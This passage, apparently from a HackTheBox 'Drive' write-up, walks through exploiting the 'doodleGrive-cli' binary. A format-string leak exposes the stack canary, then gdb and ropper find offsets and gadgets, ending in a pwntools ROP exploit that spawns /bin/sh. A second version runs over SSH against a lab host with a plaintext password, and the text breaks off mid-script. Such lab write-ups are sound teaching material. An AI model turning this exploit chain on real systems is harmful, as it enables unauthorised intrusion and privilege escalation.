+<p>I will apply some filters to extract the <code>canary</code> value:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="err">$</span> <span class="n">python3</span> <span class="n">pwned</span><span class="o">.</span><span class="n">py</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">|</span> <span class="n">grep</span> <span class="mi">00$</span>
+<span class="mi">15</span> <span class="o">-&gt;</span><span class="mi">43</span><span class="n">f1e2d9f1846100</span>
+<span class="mi">19</span> <span class="o">-&gt;</span><span class="mi">100000000</span>
+<span class="mi">23</span> <span class="o">-&gt;</span><span class="mi">1500000000</span>
+<span class="mi">25</span> <span class="o">-&gt;</span><span class="mi">3000000000</span>
+</pre></div>
+<p>It seems that the value in position <code>15</code> belongs to the <code>canary</code>. When executing the script again, its value changes, and it still ends in <code>00</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu</span><span class="err">$</span> <span class="n">python3</span> <span class="n">pwned</span><span class="o">.</span><span class="n">py</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">|</span> <span class="n">grep</span> <span class="mi">00$</span>
+<span class="mi">15</span> <span class="o">-&gt;</span><span class="n">ad11c9cfd6d66a00</span>
+<span class="mi">19</span> <span class="o">-&gt;</span><span class="mi">100000000</span>
+<span class="mi">23</span> <span class="o">-&gt;</span><span class="mi">1500000000</span>
+<span class="mi">25</span> <span class="o">-&gt;</span><span class="mi">3000000000</span>
+</pre></div>
+<p>After running the script several times, it maintains the <code>canary</code> format, so I assumed that the value in position <code>15</code> belongs to the <code>canary</code> value.</p><br/>
+<h3>Getting offsets</h3><br/>
+<p>Before obtaining function addresses and ROP gadgets, we need to know the offsets when the buffer overflow occurs and when the <code>canary</code> is overwritten.</p><br/>
+<p>To debug this binary, I will use <code>gdb</code>, specifically with the <a href="https://github.com/hugsy/gef">gef</a> extension.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span>
+<span class="n">GEF</span> <span class="k">for</span> <span class="n">linux</span> <span class="n">ready</span><span class="p">,</span> <span class="nb">type</span> <span class="err">`</span><span class="n">gef</span><span class="s1">' to start, `gef config'</span> <span class="n">to</span> <span class="n">configure</span>
+<span class="mi">88</span> <span class="n">commands</span> <span class="n">loaded</span> <span class="ow">and</span> <span class="mi">5</span> <span class="n">functions</span> <span class="n">added</span> <span class="k">for</span> <span class="n">GDB</span> <span class="mf">12.1</span> <span class="ow">in</span> <span class="mf">0.00</span><span class="n">ms</span> <span class="n">using</span> <span class="n">Python</span> <span class="n">engine</span> <span class="mf">3.10</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="nn">doodleGrive</span><span class="o">-</span><span class="n">cli</span><span class="o">...</span>
+<span class="p">(</span><span class="n">No</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span><span class="p">)</span>
+
+<span class="n">gef</span><span class="o">&gt;</span>
+</pre></div>
+<p>Firstly, I will create a pattern of 150 bytes:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">gef</span><span class="o">&gt;</span> <span class="n">pattern</span> <span class="n">create</span> <span class="mi">150</span> 
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">150</span> <span class="nb">bytes</span> <span class="p">(</span><span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="k">as</span> <span class="s1">'$_gef0'</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</pre></div>
+<p>Now I will run the binary and enter this pattern when it prompts for the password:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">gef</span><span class="o">&gt;</span>  <span class="n">pattern</span> <span class="n">create</span> <span class="mi">150</span> 
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">150</span> <span class="nb">bytes</span> <span class="p">(</span><span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="k">as</span> <span class="s1">'$_gef0'</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</pre></div>
+<p>Of course, the canary protection was triggered, and the program terminated. To prevent the program from finishing, I will create a breakpoint at the <code>xor</code> instruction of the main function (this will pause the program on the canary check).</p><br/>
+<div class="highlight"><pre><span></span><span class="n">gef</span><span class="o">&gt;</span> <span class="n">disass</span> <span class="n">main</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>  
+<span class="mh">0x0000000000402327</span> <span class="o">&lt;+</span><span class="mi">314</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">xor</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">fs</span><span class="p">:</span><span class="mh">0x28</span>   
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span> 
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">b</span> <span class="o">*</span><span class="mh">0x402327</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x402327</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</pre></div>
+<p>Now, I will restart the program:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">gef</span><span class="o">&gt;</span> <span class="n">r</span>
+</pre></div>
+<p>The breakpoint worked correctly:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/44.png"/></p><br/>
+<p>If the buffer overflow occurred, the <code>rcx</code> register should be overwritten by my pattern:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">gef</span><span class="o">&gt;</span> <span class="nb">print</span> <span class="err">$</span><span class="n">rcx</span>
+<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mh">0x6161616161616168</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</pre></div>
+<p>This value seems to be related to my payload; let's try to determine the offset:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">gef</span><span class="o">&gt;</span> <span class="n">pattern</span> <span class="n">offset</span> <span class="err">$</span><span class="n">rcx</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="s1">'6861616161616161'</span><span class="o">/</span><span class="s1">'6161616161616168'</span> <span class="k">with</span> <span class="n">period</span><span class="o">=</span><span class="mi">8</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">56</span> <span class="p">(</span><span class="n">little</span><span class="o">-</span><span class="n">endian</span> <span class="n">search</span><span class="p">)</span> <span class="n">likely</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</pre></div>
+<p>It worked! We successfully obtained the offset of <code>rcx</code>. This means that we have to enter <code>56</code> bytes before overwriting the <code>rcx</code> register.</p><br/>
+<p>Let's confirm this using Python. Firstly, I will print 56 <code>A</code> characters, followed by 8 <code>B</code> characters, and finally, 8 <code>C</code> characters.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*56+"B"*8+"C"*8)'</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC</span>
+</pre></div>
+<p>If entering this payload overwrites the <code>rcx</code> register with <code>B</code> characters, it means that we can abuse the format string vulnerability to leak the <code>canary</code> address, and we can send it back with the payload to bypass the <code>canary</code> protection.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">gef</span><span class="o">&gt;</span> <span class="n">r</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Drive</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> 
+<span class="p">[</span><span class="err">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="n">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="err">!</span><span class="p">]</span>
+<span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
+<span class="n">test</span>
+<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">test</span><span class="p">:</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+</pre></div>
+<p>Now, let's print the value of the <code>rcx</code> registry:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">gef</span><span class="o">&gt;</span> <span class="nb">print</span> <span class="err">$</span><span class="n">rcx</span>
+<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mh">0x4242424242424242</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</pre></div>
+<p>Great, it worked! We overwrote the <code>rcx</code> register with the <code>B</code> characters (42 in hexadecimal).</p><br/>
+<p>Now, we have enough information to start with the exploitation.</p><br/>
+<p>Firstly, this will be the Python script. Of course, we will modify it:</p><br/>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./doodleGrive-cli"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"%15$lx"</span><span class="p">)</span>
+<span class="n">leaked_value</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">19</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">canaryValue</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaked_value</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"canary value -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canaryValue</span><span class="p">))</span>
+</pre></div>
+<p>To exploit this buffer overflow, I will create an exploit that calls the system function and passes <code>/bin/sh</code> as an argument. To perform this, we need to know some concepts.</p><br/>
+<p>In a 64-bit program, arguments are primarily passed to functions through registers. In the x86_64 architecture, the first six arguments are passed in the registers <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, and <code>r9</code>, respectively. Additional arguments can be passed on the stack.</p><br/>
+<p>This means that we have to use ROP gadgets to store values in these registers. As we only have to pass one argument (<code>/bin/sh</code>), we will utilize the <code>rdi</code> register.</p><br/>
+<p>The <code>system</code> function is in the binary, so we can get its address:</p><br/>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./doodleGrive-cli"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./doodleGrive-cli"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"%15$lx"</span><span class="p">)</span>
+<span class="n">leaked_value</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">19</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">canaryValue</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaked_value</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"canary value -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canaryValue</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"system() addr -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+</pre></div>
+<p>The <code>/bin/sh</code> string is also present in the binary (you can install ropper from PyPI):</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ropper</span> <span class="o">-</span><span class="n">f</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> <span class="o">--</span><span class="n">string</span> <span class="s2">"/bin/sh"</span>
+
+
+<span class="n">Strings</span>
+<span class="o">=======</span>
+
+<span class="n">Address</span>     <span class="n">Value</span>    
+<span class="o">-------</span>     <span class="o">-----</span>    
+<span class="mh">0x00497cd5</span>  <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
+</pre></div>
+<p>We can copy this memory address or simply call <code>elf.search</code> in our Python script:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">"/bin/sh"</span><span class="p">))</span>
+</pre></div>
+<p>The <code>/bin/sh</code> string will be the argument for <code>system()</code>, so now we have to look for a ROP gadget that stores values into <code>rdi</code>.</p><br/>
+<p>Ropper will help us with this search:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ropper</span> <span class="o">-</span><span class="n">f</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> <span class="o">--</span><span class="n">search</span> <span class="s2">"pop rdi; ret"</span>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Load</span> <span class="n">gadgets</span> <span class="kn">from</span> <span class="nn">cache</span>
+<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">loading</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
+<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">removing</span> <span class="n">double</span> <span class="n">gadgets</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">gadgets</span><span class="p">:</span> <span class="n">pop</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">ret</span>
+
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">File</span><span class="p">:</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span>
+<span class="mh">0x0000000000401912</span><span class="p">:</span> <span class="n">pop</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401912</span>
+</pre></div>
+<p>We will also need a <code>ret</code> instruction for stack alignment:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ropper</span> <span class="o">-</span><span class="n">f</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> <span class="o">--</span><span class="n">search</span> <span class="s2">"ret"</span>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Load</span> <span class="n">gadgets</span> <span class="kn">from</span> <span class="nn">cache</span>
+<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">loading</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
+<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">removing</span> <span class="n">double</span> <span class="n">gadgets</span><span class="o">...</span> <span class="mi">100</span><span class="o">%</span>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">gadgets</span><span class="p">:</span> <span class="n">ret</span>
+
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">File</span><span class="p">:</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span>
+<span class="mh">0x0000000000401941</span><span class="p">:</span> <span class="n">ret</span> <span class="mi">0</span><span class="p">;</span> 
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+</pre></div>
+<p>The final script will be as follows:</p><br/>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./doodleGrive-cli"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./doodleGrive-cli"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"%15$lx"</span><span class="p">)</span>
+<span class="n">leaked_value</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">19</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">canaryValue</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaked_value</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>
+<span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">"/bin/sh"</span><span class="p">))</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401912</span>  <span class="c1"># ropper -f doodleGrive-cli --search "pop rdi; ret"</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000401941</span>    <span class="c1"># ropper -f doodleGrive-cli --search "ret"</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"canary value -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canaryValue</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"system() addr -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span> 
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"/bin/sh addr -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"POP RDI -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"RET -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span> 
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">56</span> <span class="c1"># Junk </span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canaryValue</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="c1"># Junk for RBP to get to RSP</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="c1"># Stack Allignment</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<p>As shown, we first create a payload with <code>56</code> bytes of junk to reach the <code>canary</code>. Subsequently, we include the <code>canary</code> value to bypass the canary protection. Following that, we add <code>8</code> bytes of junk to reach the <code>RSP</code> (Stack Pointer). This step is crucial to avoid failure in the exploit, as writing addresses in <code>RBP</code> instead of <code>RSP</code> would lead to issues. Afterward, we include the <code>ret</code> address to align the stack once we reach the <code>RSP</code> register. Finally, we utilize the <code>POP RDI</code> gadget to pass the address of <code>/bin/sh</code> and pop it into the <code>rdi</code> register. This allows us to call the <code>system()</code> function with <code>/bin/sh</code> as the argument.</p><br/>
+<p>Running this locally works:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="n">pwned</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">'/home/elswix/Desktop/elswix/HTB/Drive/content/doodleGrive-cli'</span>
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">canary</span> <span class="n">value</span> <span class="o">-&gt;</span> <span class="mh">0x8c754ae9b3cb6500</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">system</span><span class="p">()</span> <span class="n">addr</span> <span class="o">-&gt;</span> <span class="mh">0x4119d0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="n">addr</span> <span class="o">-&gt;</span> <span class="mh">0x497cd5</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">POP</span> <span class="n">RDI</span> <span class="o">-&gt;</span> <span class="mh">0x401912</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">RET</span> <span class="o">-&gt;</span> <span class="mh">0x401941</span>
+<span class="n">Invalid</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="o">.</span>
+<span class="err">$</span> <span class="nb">id</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="nb">id</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
+<span class="err">$</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">elswix</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">elswix</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">elswix</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="n">cdrom</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="n">dip</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="n">plugdev</span><span class="p">),</span><span class="mi">122</span><span class="p">(</span><span class="n">lpadmin</span><span class="p">),</span><span class="mi">135</span><span class="p">(</span><span class="n">lxd</span><span class="p">),</span><span class="mi">136</span><span class="p">(</span><span class="n">sambashare</span><span class="p">)</span>
+<span class="err">$</span>
+</pre></div>
+<p>Of course, we have to execute this on the victim machine. Since the victim machine likely won't have the <code>pwntools</code> package installed, we can create an SSH connection in our script and initiate a new process on the victim machine:</p><br/>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./doodleGrive-cli"</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">"10.10.11.235"</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s2">"tom"</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">"johnmayer7"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s2">"/home/tom/doodleGrive-cli"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">"%15$lx"</span><span class="p">)</span>
+<span class="n">leaked_value</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">19</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">canaryValue</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaked_value</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>
+<span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">"/bin/sh"</span><span class="p">))</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401912</span>  <span class="c1"># ropper -f doodleGrive-cli --search "pop rdi; ret"</span>
